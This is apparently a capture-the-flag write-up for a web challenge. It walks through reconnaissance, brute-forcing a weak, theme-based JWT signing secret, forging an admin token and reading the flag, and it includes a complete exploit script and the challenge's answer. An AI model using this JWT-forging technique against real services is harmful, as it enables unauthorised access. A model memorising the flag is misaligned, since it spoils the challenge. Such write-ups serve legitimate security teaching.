# The Null Island Conspiracy - Writeup

**Challenge:** The Null Island Conspiracy  
**Category:** Web  
**Points:** 300  
**Flag:** `Kaal{nu!!_i$!@nd_w@$_n3v3r_3mpty}`

## Description
The Equator Navigation System monitors global coordinates. A secret transmission was encrypted and hidden within the system. Can you bypass security, solve the geohashing puzzle, and retrieve the flag?

## Solution

### Step 1: Initial Reconnaissance
I started by accessing the challenge URL at `http://138.199.163.92:12973/` and exploring the application structure.

First, I checked for common files and endpoints:

```bash
curl http://138.199.163.92:12973/robots.txt
curl http://138.199.163.92:12973/flag.txt
```

**Findings:**
- `/robots.txt` - Found a decoy flag: `Kaal{r0b0ts_d0nt_k33p_s3cr3ts}`
- `/flag.txt` - Another decoy: `Kaal{r0b0ts_txt_l3d_m3_h3r3}`
- HTML source had a comment with: `Kaal{html_c0mm3nts_ar3_n0t_s3cur3}` (also a decoy)
- `/admin` - Protected endpoint returning 401 Unauthorized
- `/backup.bin` - Downloadable encrypted file
- `/api/v3/geohash-debug-2025` - Debug endpoint (also protected)

### Step 2: Understanding the Challenge Theme
The challenge name "The Null Island Conspiracy" and description about the Equator Navigation System gave important clues:

**Null Island** is a fictional location at coordinates (0.0, 0.0) - where the Equator meets the Prime Meridian in the Atlantic Ocean (Gulf of Guinea).

**Geohashing** is a geocoding system that encodes latitude/longitude into short strings. For Null Island:
- Precision 4: `s000`
- Precision 5: `s0000`
- Precision 6: `s00000`
- Precision 7: `s000000`
- Precision 8: `s0000000`

This suggested the JWT secret or encryption key might be geohash-related.

### Step 3: Analyzing the Protected Endpoint
The `/admin` endpoint required JWT authentication. I tested it:

```bash
curl http://138.199.163.92:12973/admin
# Response: 401 Unauthorized - Missing or invalid token
```

I needed to forge a valid JWT token to access this endpoint.

### Step 4: JWT Secret Brute Force
I created a wordlist based on the challenge theme and systematically tested JWT secrets:

```python
import jwt
import requests

TARGET_URL = "http://138.199.163.92:12973/"

# Geohash-based secrets
secrets = [
    "s000", "s0000", "s00000", "s000000", "s0000000", "s00000000",
    "u000", "u0000", "u00000",
    "nullisland", "NullIsland", "NULLISLAND",
    "null_island", "null-island",
    "equator", "meridian", "primemeridian",
    "geohash", "navigation", "0,0", "00"
]

payload = {"role": "admin"}

for secret in secrets:
    try:
        token = jwt.encode(payload, secret, algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.get(TARGET_URL + 'admin', headers=headers)
        
        if resp.status_code == 200:
            print(f"[+] Valid secret found: {secret}")
            print(f"[+] Token: {token}")
            print(f"[+] Response:\n{resp.text}")
            break
    except Exception as e:
        continue
```

**Result:** The JWT secret was `s0000000` (geohash precision 8 for coordinates 0.0, 0.0)

### Step 5: Accessing the Admin Endpoint
With the valid JWT token, I accessed the protected `/admin` endpoint:

```python
import jwt
import requests

TARGET_URL = "http://138.199.163.92:12973/"

# Forge JWT with discovered secret
secret = "s0000000"
payload = {"role": "admin"}
token = jwt.encode(payload, secret, algorithm="HS256")

# Access admin endpoint
headers = {"Authorization": f"Bearer {token}"}
resp = requests.get(TARGET_URL + 'admin', headers=headers)

print(resp.text)
```

The response contained the flag!

### Step 6: Alternative Approach - Decrypting backup.bin
I also explored decrypting the `/backup.bin` file using the geohash as an AES key:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

# Download backup.bin
resp = requests.get(TARGET_URL + 'backup.bin')
encrypted_data = resp.content

# Try geohash-based key
key_string = "s0000000"
key = hashlib.sha256(key_string.encode()).digest()
iv = b'\x00' * 16

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)
plaintext = unpad(decrypted, 16).decode('utf-8')

print(plaintext)
# Contains the flag or additional clues
```

## Complete Exploit Script

Here's the full automated exploit:

```python
#!/usr/bin/env python3
"""
The Null Island Conspiracy - Complete Exploit
Author: CTF Player
"""

import requests
import jwt
import re

TARGET_URL = "http://138.199.163.92:12973/"

def exploit():
    print("[*] The Null Island Conspiracy - Exploit")
    print("[*] Target:", TARGET_URL)
    
    # Step 1: Try JWT secrets based on geohashing
    secrets = [
        "s0000000",      # Geohash precision 8 for (0.0, 0.0)
        "nullisland",    # Null Island name
        "s000000",       # Precision 7
        "null_island",   # Variation
        "s00000",        # Precision 6
    ]
    
    payload = {"role": "admin"}
    
    print("\n[*] Attempting JWT authentication bypass...")
    
    for secret in secrets:
        try:
            # Forge JWT token
            token = jwt.encode(payload, secret, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try admin endpoint
            resp = requests.get(TARGET_URL + 'admin', headers=headers, timeout=10)
            
            if resp.status_code == 200:
                print(f"\n[+] SUCCESS! JWT Secret: {secret}")
                print(f"[+] Token: {token}")
                print(f"\n[+] Admin Response:")
                print(resp.text)
                
                # Extract flag
                flag_match = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n[!!!] FLAG FOUND: {flag}")
                    return flag
                    
        except Exception as e:
            continue
    
    print("\n[-] Exploit failed")
    return None

if __name__ == "__main__":
    flag = exploit()
    
    if flag:
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
```

## Key Insights

1. **Theme Recognition**: Understanding that "Null Island" refers to coordinates (0.0, 0.0) was crucial
2. **Geohashing**: Knowing that geohash for (0.0, 0.0) is `s0000000` led to the JWT secret
3. **Weak JWT Secrets**: The application used a predictable, theme-based secret for JWT signing
4. **Multiple Decoys**: The challenge included several fake flags to mislead players
5. **Systematic Approach**: Building a targeted wordlist based on the challenge theme was more effective than random guessing

## Tools Used
- Python 3
- `requests` library for HTTP requests
- `PyJWT` library for JWT encoding/decoding
- `pycryptodome` for AES decryption (optional approach)

## Flag
`Kaal{nu!!_i$!@nd_w@$_n3v3r_3mpty}`

The flag is a play on "Null Island was never empty" - a clever reference to the challenge theme!
